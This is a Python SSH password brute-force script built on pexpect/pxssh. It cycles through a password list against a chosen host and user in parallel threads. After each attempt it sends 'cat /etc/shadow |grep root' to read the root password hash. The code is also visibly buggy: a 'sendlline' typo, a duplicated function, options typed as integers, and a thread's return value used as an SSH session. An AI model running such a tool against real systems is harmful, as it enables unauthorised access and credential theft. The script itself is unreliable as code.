import pexpect
from pexpect import pxssh
import optparse
import time
from threading import Thread,BoundedSemaphore

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


PROMPT = ["#",">>>",">","\$"]

def send_command(child,cmd):
    child.sendlline(cmd)
    child.expect(PROMPT)
    print(child.before)

def connect_pxssh(user,host,password,release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host,user,password)
        print("Password Found: "+password)
        Found=True
    except Exception as e:
        if "read_nonblocking" in str(e):
            Fails += 1
            time.sleep(5)
            connect_pxssh(user,host,password,False)
        elif"synchronize with original prompt" in str(e):
            time.sleep(1)
            connect_pxssh(user,host,password,False)
    finally:
        # 尝试maxConnections 之后 退出
        if release: connection_lock.release()


# only linux work
def connect(user,host,password):
    ssh_newkey = "Are you sure you want to continue connecting"
    connStr = "ssh "+user + "@"+host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, "[P|p]assword:"])
    # session 超时
    if ret == 0:
        print("Error Connecting")
        return
    if ret == 1:
        # 主机使用新的公钥
        child.sendline("yes")
        ret = child.expect([pexpect.TIMEOUT,"[P|password:]"])
        # # session 超时
        if ret == 0:
            print("Error Connecting")
            return
        child.sendline(password)
        child.expect(PROMPT)
        return child

def send_command(child,cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)

def main():
    parser = optparse.OptionParser("usage: %prog -H <target host> -u <user> -F <password list>")
    parser.add_option("-H", dest='tgtHost', type="string", help="specify target host")
    parser.add_option("-F", dest='passwdFile', type="int", help="specify password file")
    parser.add_option("-u", dest='user', type="int", help="specify the user")
    (options,args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user
    if host == None or passwdFile == None or user == None:
        print(parser.usage)
        exit(0)
    user = options.user
    fn = open(passwdFile,"r")
    for line in fn.readlines():
        user = options.user
        if Found:
            print("Exiting: Password Found")
            exit(0)
        if Fails > 5:
            print("Exiting: Too Many Socket Timeouts")
            exit(0)
        connection_lock.acquire()
        password = line.strip("\r").strip("\n")
        print("Testing: "+ str(password))
        t = Thread(target=connect_pxssh,args=(user,host,password,True))
        child = t.start()
        send_command(child, "cat /etc/shadow |grep root")


if __name__ == '__main__':
    main()